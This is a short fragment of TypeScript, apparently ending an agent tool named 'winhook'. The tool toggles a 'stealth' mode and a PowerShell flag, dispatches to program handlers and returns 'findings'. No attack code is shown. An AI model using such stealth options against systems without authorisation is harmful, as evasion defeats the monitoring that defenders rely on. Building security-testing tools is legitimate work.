    }

    setStealthState(argVal(params.args, "--stealth") as StealthMode | undefined, hasFlag(params.args, "--pwsh"))

    const program = params.program as Program
    const handler = dispatch[program]
    const result = await handler(params.args, params.timeout_seconds)
    setStealthState(undefined, false)

    return {
      title: `winhook: ${program}`,
      output: result.output,
      metadata: { program, findings: result.findings },
    }
  },
})

